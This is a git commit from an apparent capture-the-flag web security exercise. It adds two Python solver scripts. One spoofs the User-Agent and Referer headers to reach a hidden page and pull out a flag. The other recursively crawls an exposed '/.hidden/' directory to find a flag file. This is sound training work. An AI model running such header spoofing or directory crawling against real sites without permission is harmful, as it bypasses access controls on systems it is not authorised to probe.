146f5cd32bcf2bbbb29465fe6ffc9fef6dea7ece
Dmytro Shults <dmytroshults@gmail.com>
2021-01-08 20:15:19 +0100

    Found 8 flags

---
+++ 5_custom_headers/Ressources/send_custom_headers.py
@@ -0,0 +1,23 @@
+#!/usr/bin/env python3
+
+import argparse
+import requests
+import re
+
+PARAMS = {"page": "e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c"}
+HEADERS = {"User-Agent": "ft_bornToSec", "referer": "https://www.nsa.gov/"}
+
+def main(URL):
+    r = requests.get(URL, PARAMS, headers=HEADERS)
+    # find str that starts with "flag" and match all chars until and excluding "<"
+    flag = re.search(r"flag[^<]*", r.text)
+    if flag:
+        print(flag.group(0))
+    else:
+        print("Found no flags")
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="Send a request with custom header")
+    parser.add_argument("URL", help="URL address of the server")
+    args = parser.parse_args()
+    main(args.URL)
---
+++ 8_hidden_folder/Ressources/crawler.py
@@ -0,0 +1,31 @@
+#!/usr/bin/env python3
+
+import argparse
+import requests
+import re
+import sys
+
+# find whatever is in between quotes in href
+# find all patterns (excluding '../' or 'README') that were preceded with href=" and until "
+PATTERN = re.compile(r'(?!../|README)(?<=href=")[^"]*')
+
+TEXT = set()
+
+def main(URL):
+    global TEXT
+    readme = requests.get(URL + "README")
+    TEXT.add(readme.text)
+    if readme.text and " " not in readme.text:
+        for entry in TEXT:
+            print(entry)
+        sys.exit()
+    r = requests.get(URL)
+    links = re.findall(PATTERN, r.text)
+    for link in reversed(links):
+        main(URL + link)
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="Crawl website and find the right README")
+    parser.add_argument("URL", help="URL address of the server")
+    args = parser.parse_args()
+    main(args.URL + "/.hidden/")
